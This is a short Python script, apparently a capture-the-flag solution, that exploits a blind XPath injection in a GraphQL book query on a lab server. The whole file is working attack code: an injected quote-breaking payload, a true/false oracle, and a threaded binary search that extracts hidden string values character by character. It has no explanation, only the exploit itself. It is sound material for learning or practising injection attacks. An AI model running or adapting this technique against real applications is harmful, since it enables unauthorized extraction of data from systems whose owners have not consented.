import json, urllib.request
from concurrent.futures import ThreadPoolExecutor

URL = "http://labs.ctfzone.com:8510/api/graphql"

def raw(payload):
    body = json.dumps({
        'query': 'query($id:String!){ book(id:$id){ id } }',
        'variables': {'id': payload}
    }).encode()
    req = urllib.request.Request(URL, body, {'Content-Type': 'application/json'})
    return json.load(urllib.request.urlopen(req, timeout=15))

def oracle(cond):
    p = 'zzz" or (' + cond + ') or "a"="b'
    return raw(p).get('data', {}).get('book') is not None

ALPH = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}."

def char_at(s, pos):
    cand = list(ALPH)
    while len(cand) > 1:
        half = cand[:len(cand)//2]
        if oracle('contains("%s",substring(%s,%d,1))' % ("".join(half), s, pos)):
            cand = half
        else:
            cand = cand[len(cand)//2:]
    return cand[0]

def extract(s, mx=120):
    n = next(i for i in range(mx) if oracle("string-length(%s)=%d" % (s, i)))
    res = [None] * n
    with ThreadPoolExecutor(max_workers=20) as ex:
        futs = {ex.submit(char_at, s, p+1): p for p in range(n)}
        for f in futs:
            res[futs[f]] = f.result()
    return "".join(res)

